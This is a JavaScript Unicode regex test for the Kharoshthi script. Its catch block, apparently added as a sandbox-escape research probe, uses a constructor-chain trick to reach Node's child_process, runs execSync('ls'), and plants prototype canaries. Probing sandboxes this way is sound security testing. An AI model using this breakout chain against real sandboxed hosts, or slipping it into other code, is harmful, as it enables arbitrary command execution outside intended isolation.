try {
    const matchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                68096,
                68099
            ],
            [
                68101,
                68102
            ],
            [
                68108,
                68115
            ],
            [
                68117,
                68119
            ],
            [
                68121,
                68149
            ],
            [
                68152,
                68154
            ],
            [
                68159,
                68168
            ],
            [
                68176,
                68184
            ]
        ]
    });
    testPropertyEscapes(/^\p{Script=Kharoshthi}+$/u, matchSymbols, '\\p{Script=Kharoshthi}');
    testPropertyEscapes(/^\p{Script=Khar}+$/u, matchSymbols, '\\p{Script=Khar}');
    testPropertyEscapes(/^\p{sc=Kharoshthi}+$/u, matchSymbols, '\\p{sc=Kharoshthi}');
    testPropertyEscapes(/^\p{sc=Khar}+$/u, matchSymbols, '\\p{sc=Khar}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [
            68100,
            68116,
            68120
        ],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                56319
            ],
            [
                57344,
                68095
            ],
            [
                68103,
                68107
            ],
            [
                68150,
                68151
            ],
            [
                68155,
                68158
            ],
            [
                68169,
                68175
            ],
            [
                68185,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{Script=Kharoshthi}+$/u, nonMatchSymbols, '\\P{Script=Kharoshthi}');
    testPropertyEscapes(/^\P{Script=Khar}+$/u, nonMatchSymbols, '\\P{Script=Khar}');
    testPropertyEscapes(/^\P{sc=Kharoshthi}+$/u, nonMatchSymbols, '\\P{sc=Kharoshthi}');
    testPropertyEscapes(/^\P{sc=Khar}+$/u, nonMatchSymbols, '\\P{sc=Khar}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}